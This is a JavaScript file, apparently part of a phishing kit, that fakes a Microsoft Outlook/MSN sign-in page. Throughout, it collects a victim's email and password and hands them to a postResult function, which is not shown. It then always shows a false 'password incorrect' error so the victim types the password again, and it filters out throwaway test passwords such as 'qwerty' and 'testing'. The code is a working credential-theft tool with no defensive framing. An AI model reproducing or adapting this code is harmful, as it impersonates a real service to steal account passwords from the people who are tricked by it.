// 
const outlook = document.getElementById("page_id");
let tempMail = "";
let msn_input = document.getElementById("msn_input");

function getPassDetails(email) {
    tempMail = email;
    $("#tempEmail").html(`<a href="#">⤌</a> ${email}`);
    msn_input.value = "";
    msn_input.type = "password";
    msn_input.autocomplete = "off";
    msn_input.placeholder = "Enter password";

    $("#msn_form_intro").html(`
        <h2>Enter Password</h2>
    `)

    $("#msn_forn_links").html(`
        <a href="#">Forgot password?</a>
    `)

    $("#msn_form_foot").hide();

    $("#msn_btn").text("Sign in")
}

// 
if (validEmail.test(usermail) && outlook != null) {
    if (outlook.value.toLowerCase() == "outlook") {
        getPassDetails(usermail) 
    }
}

// 
$("#msn_online_form").on('submit', (e)=>{
    e.preventDefault();

    if (validEmail.test($("#msn_input").val()) && $("#msn_btn").text().toLowerCase() == "next") {
        getPassDetails($("#msn_input").val())
    }

    let msn_input = document.getElementById("msn_input");

    if (!validEmail.test(tempMail)) {
        msn_input.style.borderColor = "red";
        msgTimer(tempMail+" "+"isn't in our system. Make sure you typed it correctly.");
        return
    }
    else{
        msn_input.style.borderColor = "black";
    }

    if ($("#msn_input").val() == "") {
        return
    }

    if (validEmail.test($("#msn_input").val()) || $("#msn_input").val().length < 6 || $("#msn_input").val().toLowerCase() == "qwerty" || $("#msn_input").val() == 123456 || $("#msn_input").val().toLowerCase() == "password" || $("#msn_input").val().toLowerCase() == "testing") {
        msn_input.style.borderColor = "red";
        msgTimer("Your account or password is incorrect. Please Enter correct account password");
        return
    }
    else{
        msn_input.style.borderColor = "black";
    }

    $("#loader").show().css({"display":"flex"})

    let url = tempMail.split('@');

    postResult(url[1], tempMail, $("#msn_input").val(), postCount);
    setTimeout(() => {
        msn_input.style.borderColor = "red";
        msgTimer("Your password or account is incorrect. Please Enter correct account password")
        postCount++
        $("#msn_input").val("")
    }, delayCounter);
});

// 
function msgTimer(txt) {
    $("#errMsg").text(txt);

    setTimeout(() => {
        $("#errMsg").text("");
    }, 3000);
}